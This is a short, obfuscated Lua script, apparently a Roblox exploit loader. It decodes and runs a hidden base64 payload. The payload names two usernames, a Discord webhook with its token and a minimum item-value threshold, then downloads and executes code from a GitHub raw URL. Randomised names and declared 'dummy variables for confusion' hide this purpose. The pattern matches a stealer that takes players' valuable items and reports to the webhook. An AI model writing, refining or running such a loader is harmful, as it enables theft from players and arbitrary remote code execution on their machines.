
local PzLMXZMR = 'VXNlcm5hbWUgPSAiaGd0cmV3c3hjdmd0cmVzIgpVc2VybmFtZTIgPSAiYmdmZHN6eGJoeXRyZXciCldlYmhvb2sgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI5ODk3MTg5MTk3Njg5NjUyNC9abkRwelQ4WURqNGRJdFFhTklCRWVpbTNCZlZ3Ti1vbnZfbnE5cFlJdFEyODJqYmFOdDZtbm1WTVRUV0tjWmRZUjRVVCIKTWluaW11bVJBUCA9IDEwMDAwMApsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NoYWRvd3N6enp6L3RpbW9jaXkvcmVmcy9oZWFkcy9tYWluL21haW4iLCB0cnVlKSkoKQ=='
local PNBCYsZx = function(s) 
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'; 
    s = string.gsub(s, '[^'..b..'=]', ''); 
    return (s:gsub('.', function(x) 
        if x == '=' then return '' end; 
        local r,f='',(b:find(x)-1); 
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end 
        return r; 
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) 
        if (#x ~= 8) then return '' end; 
        local c=0; 
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end 
        return string.char(c) 
    end)) 
end
local ehJIApRElZk = PNBCYsZx(PzLMXZMR)
loadstring(ehJIApRElZk)() -- Run decoded code

-- Dummy variables for confusion
local qIOxktUJBTGV = math.random()
local HiEFDxgjTyK = "This is a dummy string"
